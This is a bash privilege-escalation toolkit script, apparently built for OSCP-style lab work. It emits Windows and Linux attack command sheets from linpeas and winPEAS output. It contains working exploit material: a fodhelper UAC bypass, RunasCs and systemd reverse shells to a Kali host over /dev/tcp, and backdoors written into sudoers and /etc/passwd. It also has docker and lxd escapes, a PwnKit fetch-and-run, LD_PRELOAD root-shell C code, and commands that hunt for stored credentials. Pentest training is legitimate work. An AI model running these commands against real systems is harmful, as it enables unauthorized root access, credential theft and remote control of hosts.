reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultPassword DefaultUserName AutoAdminLogon"

### GPP — Groups.xml in SYSVOL (MS14-025, still in old domains) ###
# Search local SYSVOL cache + any mapped share:
Get-ChildItem -Path C:\ -Include Groups.xml,Services.xml,ScheduledTasks.xml,Printers.xml,DataSources.xml,Drives.xml -File -Recurse -ErrorAction SilentlyContinue 2>nul
findstr /S /I cpassword C:\*.xml 2>nul
# Any cpassword="..." value → exfil to Kali and run:
#   gpp-decrypt "<CPASSWORD>"       (comes with Kali's gpp-decrypt package)

### Documents (may contain passwords) ###
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 2>nul

### WSL — may expose root-on-Linux escape ###
wsl --list --verbose 2>nul
# If a distro is installed, try entering as root:
wsl -u root -- /bin/bash
# On WSL 1 the Linux filesystem is fully exposed at:
#   C:\Users\<USER>\AppData\Local\Packages\<Distro>\LocalState\rootfs\
# Host files writable from WSL: /mnt/c/... (with same user privileges, but note: root inside WSL = SYSTEM is NOT implied)
# Historic CVE: CVE-2019-0571 (WSL privilege escalation) — rare on modern builds.

#----------------------------------------------------------------------
# PHASE 4: NETWORK & SERVICES
#----------------------------------------------------------------------

### Internal services ###
netstat -ano
# LISTENING on 127.0.0.1 = internal-only → port forward → exploit

### Network info ###
ipconfig /all
route print
arp -a

### Users & groups ###
net user
net localgroup administrators
net user %USERNAME%

### Installed software (exploit research) ###
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>nul | Select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>nul | Select displayname

### Running processes ###
Get-Process
# Compare installed software + running processes against searchsploit

#----------------------------------------------------------------------
# PHASE 5: REGISTRY AUTORUNS
#----------------------------------------------------------------------
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce 2>nul
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul
# If binary path is writable → replace with payload + reboot

#----------------------------------------------------------------------
# PHASE 6: AV/APPLOCKER STATUS
#----------------------------------------------------------------------
Get-MpComputerStatus 2>nul
sc query windefend
(Get-ApplockerPolicy -Effective 2>nul).RuleCollections
# Also check for other AV:
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct 2>nul

#----------------------------------------------------------------------
# PHASE 6½: WRITABLE PATH DIRECTORIES (DLL hijack vector)
#----------------------------------------------------------------------
# Check if any directory in system PATH is writable by current user:
# for /f "tokens=*" %a in ('echo %PATH:;=&echo %') do @icacls "%a" 2>nul | findstr /i "(F) (M) (W) :\"
# Writable PATH dir = potential DLL search order hijack

#----------------------------------------------------------------------
# PHASE 6¾: RunasCs — USE FOUND CREDENTIALS
#----------------------------------------------------------------------
# If you found creds but can't use runas (no interactive session):
# .\RunasCs.exe <user> <password> cmd
# .\RunasCs.exe <user> <password> cmd -b              # UAC bypass (admin group, not RID 500)
# .\RunasCs.exe <user> <password> cmd -r KALI_IP_PLACEHOLDER:PORT  # reverse shell as that user
# .\RunasCs.exe <user> <password> cmd -d domain.local  # domain user

#----------------------------------------------------------------------
# PHASE 7: UAC CHECK (if local admin but medium integrity)
#----------------------------------------------------------------------
whoami /groups | findstr "Level"
# Medium Mandatory Level + admin group?
# fodhelper bypass:
#   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\Public\reverse.exe" /f
#   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
#   fodhelper.exe
#   reg delete HKCU\Software\Classes\ms-settings /f

#----------------------------------------------------------------------
# PHASE 8: KERNEL EXPLOITS (LAST RESORT)
#----------------------------------------------------------------------
systeminfo
# Transfer systeminfo output to Kali:
# python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only

#----------------------------------------------------------------------
# COMPLETE QUICK-RUN BLOCK (copy-paste entire block — PowerShell)
#----------------------------------------------------------------------
Write-Host "===== CONTEXT =====" ; whoami ; whoami /priv ; whoami /groups ; hostname ; Write-Host "===== STORED CREDS =====" ; cmdkey /list ; Write-Host "===== PS HISTORY =====" ; type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 2>$null ; Write-Host "===== SERVICES =====" ; Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'} ; Write-Host "===== SCHTASKS =====" ; schtasks /query /fo LIST /v 2>$null | Select-String "TaskName|Run As|Task To Run" ; Write-Host "===== ALWAYS ELEVATED =====" ; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null ; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null ; Write-Host "===== NETWORK =====" ; netstat -ano | Select-String "LISTEN" ; ipconfig /all ; Write-Host "===== DONE ====="
WINDOWS_COMMANDS

    # Replace placeholders with actual values
    sed -i "s/KALI_IP_PLACEHOLDER/${kali_ip}/g" "$cmd_file" 2>/dev/null

    success "Windows commands written to: $cmd_file"
}

#==============================================================================
# QUICK-WINS PARSER: Extract high-value findings from tool output
#==============================================================================
parse_linux_output() {
    local input_file="$1"
    local output_dir="$2"
    local target_ip="${3:-}"
    local quickwins="$output_dir/quick-wins.txt"
    local raw_dir="$output_dir/raw"
    local kali_ip
    kali_ip=$(get_kali_ip)

    phase "Parsing Linux enumeration output"
    mkdir -p "$raw_dir"
    cp "$input_file" "$raw_dir/" 2>/dev/null

    {
        echo "============================================================"
        echo "  LINUX PRIVILEGE ESCALATION — QUICK WINS REPORT"
        echo "  Generated: $(date)"
        echo "  Source: $input_file"
        echo "============================================================"
        echo ""

        # 1. sudo -l findings
        echo "=== SUDO ENTRIES ==="
        grep -A5 -i "User.*may run\|NOPASSWD\|env_keep\|sudo -l" "$input_file" 2>/dev/null | head -30
        echo ""

        # 2. SUID binaries (filter out standard ones)
        echo "=== SUID BINARIES (non-standard) ==="
        grep -i "suid\|4000\|/usr/bin/\|/usr/sbin/\|/usr/local/" "$input_file" 2>/dev/null | \
            grep -vE "mount|umount|su$|ping$|chfn|chsh|newgrp|passwd|gpasswd|pkexec|snap|fusermount|ntfs" | head -20
        echo ""

        # 3. Capabilities
        echo "=== CAPABILITIES ==="
        grep -i "cap_setuid\|cap_dac_read\|cap_net_raw\|cap_setgid\|cap_sys_admin" "$input_file" 2>/dev/null | head -10
        echo ""

        # 4. Writable files
        echo "=== WRITABLE CRITICAL FILES ==="
        grep -iE "(passwd|shadow|sudoers|cron|systemd|service).*(writable|is writable)|writable.*(passwd|shadow|sudoers|cron|systemd|service)" "$input_file" 2>/dev/null | head -10
        echo ""

        # 4b. Shared object hijacking
        echo "=== SHARED OBJECT / LIBRARY ISSUES ==="
        grep -iE "\.so.*not found|LD_PRELOAD|LD_LIBRARY_PATH|RPATH|RUNPATH" "$input_file" 2>/dev/null | head -10
        echo ""

        # 5. Cron jobs
        echo "=== CRON / SCHEDULED TASKS ==="
        grep -iE "cron|timer|schedule" "$input_file" 2>/dev/null | grep -v "^#" | head -20
        echo ""

        # 6. Credentials found
        echo "=== CREDENTIALS / SENSITIVE DATA ==="
        grep -iE "password[[:space:]]*[=:]|passwd[[:space:]]*[=:]|secret[[:space:]]*[=:]|token[[:space:]]*[=:]|private.key\|id_rsa" "$input_file" 2>/dev/null | head -20
        echo ""

        # 7. Internal services
        echo "=== INTERNAL SERVICES (127.0.0.1) ==="
        grep -E "127\.0\.0\.1:[0-9]+" "$input_file" 2>/dev/null | head -10
        echo ""

        # 8. Interesting groups
        echo "=== INTERESTING GROUP MEMBERSHIP ==="
        grep -iE "docker|lxd|disk|adm|video|shadow" "$input_file" 2>/dev/null | head -10
        echo ""

        # 9. NFS
        echo "=== NFS EXPORTS ==="
        grep -i "no_root_squash\|nfs\|exports" "$input_file" 2>/dev/null | head -5
        echo ""

        # 10. Kernel info
        echo "=== KERNEL / OS ==="
        grep -iE "Linux version|uname|kernel" "$input_file" 2>/dev/null | head -5
        echo ""

        # 10b. pkexec / polkit version (PwnKit = CVE-2021-4034)
        echo "=== PKEXEC / POLKIT VERSION ==="
        grep -iE "pkexec.*version|polkit.*version|policykit" "$input_file" 2>/dev/null | head -5
        echo ""

        # 11. linpeas RED/YELLOW highlights
        echo "=== LINPEAS HIGH-PRIORITY (RED/YELLOW) ==="
        grep -E "\[1;31m|\[1;33m|95%|99%" "$input_file" 2>/dev/null | head -30
        echo ""

    } | sed 's/\x1B\[[0-9;]*[mGKHF]//g' > "$quickwins"

    success "Quick-wins report: $quickwins"
    echo ""
    cat "$quickwins"

    # ── Post-parse attack commands ────────────────────────────────────────────
    local acfile="$output_dir/attack_commands.txt"
    {
        echo "============================================================"
        echo "  LINUX ESCALATION ATTACK COMMANDS"
        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  GTFObins: https://gtfobins.github.io/"
        echo "============================================================"
        echo ""

        # sudo CVE-2019-14287 — (ALL, !root) runas_spec bypass (sudo < 1.8.28)
        # If a user can run any command as any user EXCEPT root, the negation
        # can be bypassed with a UID of -1 (interpreted as 0 = root).
        if grep -qE '\(ALL\s*,?\s*!root\)|\(\s*[^)]*\s*,\s*!root\s*\)' "$quickwins" 2>/dev/null; then
            echo "[ SUDO CVE-2019-14287 — (ALL, !root) bypass ]"
            echo "------------------------------------------------------------"
            echo "# Evidence: sudoers entry matches (ALL, !root) or similar negation"
            echo "# sudo < 1.8.28 treats -u#-1 as UID 0 (= root), bypassing !root"
            echo "sudo --version  # confirm < 1.8.28"
            echo "sudo -u#-1 /bin/bash"
            echo "# Or for specific NOPASSWD binary (replace /bin/id):"
            echo "sudo -u#-1 /bin/id"
            echo ""
        fi

        # Sudo NOPASSWD → exploit commands
        local sudo_entries
        sudo_entries=$(grep -iE "NOPASSWD" "$quickwins" 2>/dev/null | grep -v '^#\|^=')
        if [[ -n "${sudo_entries}" ]]; then
            echo "[ SUDO NOPASSWD ]"
            echo "------------------------------------------------------------"
            while IFS= read -r entry; do
                [[ -z "${entry}" ]] && continue
                local bin
                bin=$(echo "${entry}" | grep -oP 'NOPASSWD:\s*\K\S+' | head -1)
                bin=$(basename "${bin:-unknown}" 2>/dev/null)
                echo "# ${entry}"
                case "${bin}" in
                    bash|sh|zsh|dash|fish)  echo "sudo ${bin} -p" ;;
                    vim|vi)    echo "sudo ${bin}  # :!/bin/bash" ;;
                    python|python2|python3) echo "sudo ${bin} -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'" ;;
                    perl)      echo "sudo ${bin} -e 'exec \"/bin/bash\";'" ;;
                    find)      echo "sudo ${bin} /. -exec /bin/bash \\;" ;;
                    awk|gawk)  echo "sudo ${bin} 'BEGIN {system(\"/bin/bash\")}'" ;;
                    env)       echo "sudo ${bin} /bin/bash" ;;
                    less|more) echo "sudo ${bin} /etc/passwd  # type: !bash" ;;
                    nmap)      echo "echo 'os.execute(\"/bin/bash\")' > /tmp/n.nse && sudo ${bin} --script /tmp/n.nse" ;;
                    tee)       echo "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo ${bin} -a /etc/sudoers" ;;
                    git)       echo "sudo ${bin} -p help config  # pager opens — type: !/bin/sh"
                               echo "# or:  sudo ${bin} branch --help  # same pager trick" ;;
                    *)         echo "# https://gtfobins.github.io/gtfobins/${bin}/#sudo" ;;
                esac
                echo ""
            done <<< "${sudo_entries}"
        fi

        # SUID binaries → exploit commands
        local suid_entries
        suid_entries=$(grep -E '/usr/|/bin/|/sbin/|/opt/' "$quickwins" 2>/dev/null | \
            grep -vE 'ping$|su$|sudo$|passwd$|newgrp$|chfn$|chsh$|gpasswd$|pkexec$|mount$|umount$')
        if [[ -n "${suid_entries}" ]]; then
            echo "[ SUID BINARIES ]"
            echo "------------------------------------------------------------"
            while IFS= read -r suid_path; do
                [[ -z "${suid_path}" ]] && continue
                local suid_bin
                suid_bin=$(basename "${suid_path}" | awk '{print $1}')
                echo "# SUID: ${suid_path}"
                case "${suid_bin}" in
                    bash|sh|dash)   echo "${suid_path} -p" ;;
                    find)           echo "${suid_path} /. -exec /bin/bash -p \\;" ;;
                    vim|vi)         echo "${suid_path} -c ':!/bin/bash -p'" ;;
                    python|python2|python3) echo "${suid_path} -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'" ;;
                    perl)           echo "${suid_path} -e 'exec \"/bin/bash -p\";'" ;;
                    env)            echo "${suid_path} /bin/bash -p" ;;
                    awk|gawk)       echo "${suid_path} 'BEGIN {system(\"/bin/bash -p\")}'" ;;
                    nmap)           echo "echo 'os.execute(\"/bin/bash -p\")' > /tmp/s.nse && ${suid_path} --script /tmp/s.nse" ;;
                    *)              echo "# https://gtfobins.github.io/gtfobins/${suid_bin}/#suid" ;;
                esac
                echo ""
            done <<< "${suid_entries}"
        fi

        # Writable critical files
        if grep -qiE 'sudoers.*writable|writable.*sudoers' "$quickwins" 2>/dev/null; then
            echo "[ WRITABLE SUDOERS ]"
            echo "------------------------------------------------------------"
            echo "echo '\$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
            echo "sudo bash"
            echo ""
        fi
        if grep -qiE 'passwd.*writable|writable.*passwd' "$quickwins" 2>/dev/null; then
            echo "[ WRITABLE /etc/passwd ]"
            echo "------------------------------------------------------------"
            echo "openssl passwd -1 hacked"
            echo "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd"
            echo "su root2  # password: hacked"
            echo ""
        fi

        # NFS no_root_squash
        if grep -qi 'no_root_squash' "$quickwins" 2>/dev/null; then
            echo "[ NFS no_root_squash ]"
            echo "------------------------------------------------------------"
            echo "# On Kali — mount the export, copy bash, set SUID:"
            echo "showmount -e <TARGET_IP>"
            echo "mkdir /mnt/nfs && mount -t nfs <TARGET_IP>:/<EXPORT> /mnt/nfs"
            echo "cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash"
            echo "# On target:"
            echo "/mnt/<EXPORT_LOCALPATH>/bash -p"
            echo ""
        fi

        # Capabilities
        local cap_entries
        cap_entries=$(grep -iE 'cap_setuid|cap_dac|cap_net_raw|cap_sys' "$quickwins" 2>/dev/null)
        if [[ -n "${cap_entries}" ]]; then
            echo "[ FILE CAPABILITIES ]"
            echo "------------------------------------------------------------"
            while IFS= read -r cap_line; do
                [[ -z "${cap_line}" ]] && continue
                echo "# ${cap_line}"
                local cap_bin
                cap_bin=$(echo "${cap_line}" | awk '{print $1}' | xargs basename 2>/dev/null)
                case "${cap_line}" in
                    *cap_setuid*)
                        case "${cap_bin}" in
                            python*) echo "${cap_bin} -c 'import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'" ;;
                            perl)    echo "${cap_bin} -e 'use POSIX(setuid); POSIX::setuid(0); exec \"/bin/bash\";'" ;;
                            *)       echo "# https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
                        esac ;;
                    *cap_dac*)
                        echo "# Read /etc/shadow: ${cap_bin} /etc/shadow" ;;
                esac
                echo ""
            done <<< "${cap_entries}"
        fi

        # Interesting group membership → exploit commands
        local group_hits
        group_hits=$(grep -iE '\bdocker\b|\blxd\b|\blxc\b|\bdisk\b|\badm\b' "$quickwins" 2>/dev/null | head -5)
        if [[ -n "${group_hits}" ]]; then
            echo "[ INTERESTING GROUP MEMBERSHIP ]"
            echo "------------------------------------------------------------"
            if echo "${group_hits}" | grep -qi '\bdocker\b'; then
                echo "# docker group — escape to host:"
                echo "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
                echo ""
            fi
            if echo "${group_hits}" | grep -qiE '\blxd\b|\blxc\b'; then
                echo "# lxd/lxc group — privileged container escape:"
                echo "# On Kali: build alpine image"
                echo "git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && ./build-alpine"
                echo "# Transfer .tar.gz to target, then:"
                echo "lxc image import ./<IMAGE>.tar.gz --alias alpine"
                echo "lxc init alpine privesc -c security.privileged=true"
                echo "lxc config device add privesc hostdisk disk source=/ path=/mnt/root recursive=true"
                echo "lxc start privesc && lxc exec privesc /bin/sh"
                echo "# Inside container: chroot /mnt/root bash"
                echo ""
            fi
            if echo "${group_hits}" | grep -qi '\bdisk\b'; then
                echo "# disk group — raw device access:"
                echo "df -h   # find root partition device (e.g. /dev/sda1)"
                echo "debugfs /dev/sda1"
                echo "# In debugfs: cat /etc/shadow  OR  cat /root/.ssh/id_rsa"
                echo ""
            fi
            if echo "${group_hits}" | grep -qi '\badm\b'; then
                echo "# adm group — read system logs for credentials:"
                echo "grep -iE 'pass|password|secret|token|credential' /var/log/syslog /var/log/auth.log 2>/dev/null | head -20"
                echo "grep -iE 'pass|password' /var/log/apache2/access.log 2>/dev/null | head -20"
                echo ""
            fi
        fi

        # Kernel version → searchsploit
        local kernel_ver
        kernel_ver=$(grep -oP 'Linux version \K[0-9]+\.[0-9]+\.[0-9]+' "$quickwins" 2>/dev/null | head -1)
        if [[ -z "${kernel_ver}" ]]; then
            kernel_ver=$(grep -oP '\buname.*?:\K\s*\K[0-9]+\.[0-9]+\.[0-9]+' "$quickwins" 2>/dev/null | head -1)
        fi
        if [[ -n "${kernel_ver}" ]]; then
            echo "[ KERNEL VERSION — CVE LOOKUP ]"
            echo "------------------------------------------------------------"
            echo "# Kernel: ${kernel_ver}"
            echo "searchsploit linux kernel ${kernel_ver%.*}"
            echo "# Common high-value: DirtyPipe (5.8-5.16), PwnKit (pkexec), Baron Samedit (sudo < 1.9.5p2)"
            echo "# Run les.sh on target: ./les.sh 2>/dev/null | head -40"
            echo "# *** CRASH RISK *** kernel exploits can panic the VM — use LAST"
            echo ""
        fi

        # PwnKit (CVE-2021-4034) — pkexec present on most pre-Feb-2022 distros
        if grep -qiE 'pkexec|polkit|policykit' "$quickwins" 2>/dev/null; then
            echo "[ PWNKIT — CVE-2021-4034 (pkexec local root) ]"
            echo "------------------------------------------------------------"
            echo "# Evidence: pkexec / polkit present in output"
            echo "# Manual PoC (no MSF). Pick one:"
            echo "#   https://github.com/arthepsy/CVE-2021-4034     (1-file C PoC)"
            echo "#   https://github.com/ly4k/PwnKit              (single binary PoC)"
            echo ""
            echo "# Compile on Kali (musl-static for portability):"
            echo "gcc -Wall -s -o pwnkit cve-2021-4034.c"
            echo ""
            echo "# Transfer + run:"
            echo "# (via escalatr HTTP: wget http://<KALI_IP>:<PORT>/pwnkit -O /tmp/pwnkit && chmod +x /tmp/pwnkit)"
            echo "/tmp/pwnkit"
            echo "# → you should land in a root shell immediately"
            echo ""
            echo "# Patched if: polkit >= 0.120-2 / pkexec sources mention CVE-2021-4034"
            echo ""
        fi

        # LD_PRELOAD hijack — sudo env_keep or SUID with preserved env
        if grep -qiE 'LD_PRELOAD|env_keep.*LD_PRELOAD' "$quickwins" 2>/dev/null; then
            echo "[ LD_PRELOAD HIJACK — sudo env_keep=LD_PRELOAD ]"
            echo "------------------------------------------------------------"
            echo "# Evidence: env_keep+=LD_PRELOAD in sudo -l output"
            echo "# Constructor runs as root when sudo invokes the allowed command."
            cat << 'CEOF'
# /tmp/preload.c:
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) pwn() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
CEOF
            echo "gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c"
            echo ""
            echo "# Trigger (use any NOPASSWD command):"
            echo "sudo LD_PRELOAD=/tmp/preload.so <ALLOWED_CMD>"
            echo "/tmp/rootbash -p"
            echo ""
        fi

        # LD_LIBRARY_PATH hijack — sudo env_keep or ELF with RPATH/RUNPATH
        if grep -qiE 'LD_LIBRARY_PATH|env_keep.*LD_LIBRARY_PATH|RPATH|RUNPATH' "$quickwins" 2>/dev/null; then
            echo "[ LD_LIBRARY_PATH HIJACK — env_keep or RPATH-writable ]"
            echo "------------------------------------------------------------"
            echo "# Evidence: env_keep+=LD_LIBRARY_PATH or SUID binary with writable RPATH"
            echo "# Find what shared libs the target loads:"
            echo "ldd /path/to/target_binary"
            echo "# Pick one of the needed libraries (e.g. libcrypto.so.1.1)"
            cat << 'CEOF'
# /tmp/hijack.c — replicate the same so-name the binary expects:
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) pwn() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
CEOF
            echo "gcc -shared -fPIC -o /tmp/libcrypto.so.1.1 /tmp/hijack.c"
            echo ""
            echo "# Trigger:"
            echo "sudo LD_LIBRARY_PATH=/tmp <ALLOWED_CMD>"
            echo ""
        fi

        # SUID binary loading .so from writable dir — no env_keep needed
        if grep -qiE '\.so.*writable|shared object.*writable|writable.*\.so' "$quickwins" 2>/dev/null; then
            echo "[ SUID SHARED OBJECT — writable .so path ]"
            echo "------------------------------------------------------------"
            echo "# Evidence: SUID binary loads .so from a path writable by current user"
            echo "# Discover missing / writable libs:"
            echo "strace <SUID_BIN> 2>&1 | grep -E 'open.*\\.so|No such file'"
            echo "readelf -d <SUID_BIN> | grep -E 'RPATH|RUNPATH|NEEDED'"
            echo ""
            echo "# Compile a replacement .so with a constructor that spawns a root shell:"
            cat << 'CEOF'
# /tmp/libhijack.c:
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) pwn() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
CEOF
            echo "gcc -shared -fPIC -o /path/to/writable/<NEEDED_LIB>.so /tmp/libhijack.c"
            echo "<SUID_BIN>  # → root shell"
            echo ""
        fi

        # Writable systemd units
        if grep -qiE 'writable.*systemd|systemd.*writable|/etc/systemd.*write' "$quickwins" 2>/dev/null; then
            echo "[ WRITABLE SYSTEMD UNIT ]"
            echo "------------------------------------------------------------"
            echo "# Inject reverse shell into ExecStart:"
            echo "# 1. Find writable unit file (from linpeas output):"
            echo "find /etc/systemd/system -writable -type f 2>/dev/null"
            echo ""
            echo "# 2. Modify ExecStart:"
            echo "sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"bash -i >\\& /dev/tcp/<KALI_IP>/4444 0>\\&1\"|' /etc/systemd/system/<SERVICE>.service"
            echo ""
            echo "# 3. Reload and restart:"
            echo "systemctl daemon-reload && systemctl restart <SERVICE>"
            echo ""
            echo "# 4. Catch on Kali:"
            echo "nc -lvnp 4444"
            echo ""
        fi

        # Credentials in files → crackr / sprayr routing
        local cred_file_hits
        cred_file_hits=$(grep -iE 'password[[:space:]]*[=:]|DefaultPassword|AutoLogon|cleartext|plaintext' "$quickwins" 2>/dev/null | head -5)
        if [[ -n "${cred_file_hits}" ]]; then
            echo "[ CREDENTIALS FOUND IN FILES ]"
            echo "------------------------------------------------------------"
            echo "# Plaintext credentials found — test and spray:"
            while IFS= read -r cred_file_line; do
                printf '  %s\n' "$cred_file_line"
            done <<< "${cred_file_hits}"
            echo ""
            echo "# Validate immediately:"
            echo "${SCRIPT_DIR}/sprayr.sh -u <USER> -p '<FOUND_PASSWORD>' -t <TARGET_IP>"
            echo "# OR hash-spray after cracking:"
            echo "${SCRIPT_DIR}/crackr.sh -H '<HASH_IF_HASHED>' -q"
            echo "${SCRIPT_DIR}/sprayr.sh --from-creds"
            echo ""
        fi

        # Internal services
        local internal_ports
        internal_ports=$(grep -oP '127\.0\.0\.1:\K[0-9]+' "$quickwins" 2>/dev/null | sort -u)
        if [[ -n "${internal_ports}" ]]; then
            echo "[ INTERNAL SERVICES — tunnel from Kali ]"
            echo "------------------------------------------------------------"
            while IFS= read -r port; do
                [[ -z "${port}" ]] && continue
                echo "# Port ${port}:"
                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} <USER>@<TARGET_IP>"
                echo "# OR: ${SCRIPT_DIR}/pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip <TARGET_IP>"
            done <<< "${internal_ports}"
            echo ""
        fi

        echo "============================================================"
    } > "${acfile}"

    # Resolve known values — no placeholders in copy-paste commands
    sed -i "s/<KALI_IP>/${kali_ip}/g" "${acfile}" 2>/dev/null
    [[ -n "${target_ip}" ]] && sed -i "s/<TARGET_IP>/${target_ip}/g" "${acfile}" 2>/dev/null
    cp "${acfile}" "${output_dir}/next_steps.txt" 2>/dev/null || true

    success "Attack commands → ${acfile}"
    success "Next steps alias → ${output_dir}/next_steps.txt"
    warn "cat ${output_dir}/next_steps.txt  # ← START HERE for exploitation"
}

parse_windows_output() {
    local input_file="$1"
    local output_dir="$2"
    local target_ip="${3:-}"
    local quickwins="$output_dir/quick-wins.txt"
    local raw_dir="$output_dir/raw"
    local kali_ip
    kali_ip=$(get_kali_ip)

    phase "Parsing Windows enumeration output"
    mkdir -p "$raw_dir"
    cp "$input_file" "$raw_dir/" 2>/dev/null

    {
        echo "============================================================"
        echo "  WINDOWS PRIVILEGE ESCALATION — QUICK WINS REPORT"
        echo "  Generated: $(date)"
        echo "  Source: $input_file"
        echo "============================================================"
        echo ""

        # 1. Token privileges
        echo "=== TOKEN PRIVILEGES ==="
        grep -iE "SeImpersonate|SeBackup|SeDebug|SeRestore|SeManageVolume|SeAssignPrimaryToken|SeTakeOwnership|SeLoadDriver|SeCreateToken|SeTcb" "$input_file" 2>/dev/null | head -15
        echo ""

        # 2. Stored credentials
        echo "=== STORED CREDENTIALS ==="
        grep -iA2 "cmdkey\|runas\|savecred\|Target:" "$input_file" 2>/dev/null | head -10
        echo ""

        # 3. Unquoted service paths
        echo "=== UNQUOTED SERVICE PATHS ==="
        grep -iE "unquoted|Program Files.*\.exe" "$input_file" 2>/dev/null | grep -v '\"' | head -10
        echo ""

        # 4. Writable services
        echo "=== MODIFIABLE SERVICES ==="
        grep -iE "modifiable|writable.*service\|Full Control.*service\|BUILTIN.*Users.*(F|M)" "$input_file" 2>/dev/null | head -10
        echo ""

        # 4b. DLL hijacking / writable PATH
        echo "=== DLL HIJACKING / WRITABLE PATH ==="
        grep -iE "NAME NOT FOUND|DllMain|writable.*PATH|writable.*directory" "$input_file" 2>/dev/null | head -10
        echo ""

        # 5. AlwaysInstallElevated
        echo "=== ALWAYS INSTALL ELEVATED ==="
        grep -iA1 "AlwaysInstallElevated" "$input_file" 2>/dev/null | head -5
        echo ""

        # 6. Scheduled tasks (non-Microsoft)
        echo "=== SCHEDULED TASKS (interesting) ==="
        grep -iB1 -A3 "Task To Run\|Run As" "$input_file" 2>/dev/null | grep -v "Microsoft\|Windows\|N/A" | head -20
        echo ""

        # 7. Credentials in files
        echo "=== CREDENTIALS IN FILES ==="
        grep -iE "password[[:space:]]*[=:]|DefaultPassword|AutoLogon|AutoAdminLogon|Unattend|sysprep" "$input_file" 2>/dev/null | head -15
        echo ""

        # 7b. GPP Groups.xml / cpassword leaks (MS14-025)
        echo "=== GPP / GROUPS.XML (cpassword) ==="
        grep -iE "Groups\.xml|cpassword|Services\.xml|ScheduledTasks\.xml|Drives\.xml|DataSources\.xml" "$input_file" 2>/dev/null | head -10
        echo ""

        # 7c. WSL detection (potential cross-OS pivot)
        echo "=== WSL / LINUX SUBSYSTEM ==="
        grep -iE "wsl\.exe|WindowsSubsystemForLinux|\\\\wsl\$|LxssManager" "$input_file" 2>/dev/null | head -5
        echo ""

        # 8. PowerShell history content
        echo "=== POWERSHELL HISTORY CONTENT ==="
        grep -iA2 "ConsoleHost_history\|PSReadline" "$input_file" 2>/dev/null | head -10
        echo ""

        # 9. Internal listeners
        echo "=== INTERNAL LISTENERS ==="
        grep -E "127\.0\.0\.1:[0-9]+" "$input_file" 2>/dev/null | head -10
        echo ""

        # 10. winPEAS highlights
        echo "=== WINPEAS HIGH-PRIORITY ==="
        grep -iE "\[!\]|\[\+\]|interesting|writable" "$input_file" 2>/dev/null | head -30
        echo ""

    } | sed 's/\x1B\[[0-9;]*[mGKHF]//g' > "$quickwins"

    success "Quick-wins report: $quickwins"
    echo ""
    cat "$quickwins"

    # ── Post-parse Windows attack commands ───────────────────────────────────
    local acfile="$output_dir/attack_commands.txt"
    {
        echo "============================================================"
        echo "  WINDOWS ESCALATION ATTACK COMMANDS"
        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "============================================================"
        echo ""
        echo "# ───────────────────────────────────────────────────────────"
        echo "# OffSec RULE: Metasploit (msfvenom / msfconsole / meterpreter)"
        echo "# is limited to ONE target across the entire engagement."
        echo "# Many recipes below use msfvenom for convenience."
        echo "# Manual alternatives (no MSF):"
        echo "#   - PE revshell: x86_64-w64-mingw32-gcc revshell.c -o rev.exe"
        echo "#     (compile Adam Chester-style C revshell, or use nim/golang)"
        echo "#   - PowerShell: Invoke-PowerShellTcp.ps1 (nishang) or"
        echo "#     powercat -c <KALI> -p 4444 -e powershell"
        echo "#   - MSI: WixSharp, or hand-roll WiX XML + candle.exe/light.exe"
        echo "#   - DLL revshell: x86_64-w64-mingw32-gcc -shared revshell.c -o r.dll"
        echo "# Reserve your MSF shot for the one target that absolutely needs"
        echo "# it (typically a legacy MS17-010/CVE-era box with no stable manual PoC)."
        echo "# Note: OffSec+ removed buffer overflow from the engagement body of knowledge."
        echo "# ───────────────────────────────────────────────────────────"
        echo ""

        # Token privileges → Potato selection
        local token_privs
        token_privs=$(grep -iE "SeImpersonate|SeBackup|SeDebug|SeRestore|SeManageVolume|SeAssignPrimaryToken|SeTakeOwnership|SeLoadDriver" "$quickwins" 2>/dev/null)
